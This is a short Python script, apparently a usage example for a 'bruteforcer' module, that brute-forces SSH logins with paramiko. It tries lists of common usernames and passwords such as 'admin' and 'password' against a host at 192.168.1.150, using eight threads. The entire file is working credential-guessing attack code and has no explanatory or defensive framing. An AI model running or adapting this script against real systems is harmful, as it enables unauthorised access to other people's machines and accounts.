import paramiko
import socket			# pip3 install paramiko



def attempt_fx(pair):
	
		username = pair[0]
		password = pair[1]

		try:
			client = paramiko.SSHClient()
			client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

			client.connect(hostname="192.168.1.150", username=username, password=password, timeout=3)

			return True

		except socket.timeout:
			return "retry"			# Not reachable, retry

		except:
			return False			# Failed




###################################################################################################################



import bruteforcer

number_threads = 8
wordlist_var = None
username_var = ["admin", "bill", "user", "demo"]
password_var = ["demo", "safe", "password"]

b = bruteforcer.Bruteforcer(number_threads, wordlist_var, username_var, password_var, attempt_fx)
b.run()
b.kill_all_threads()
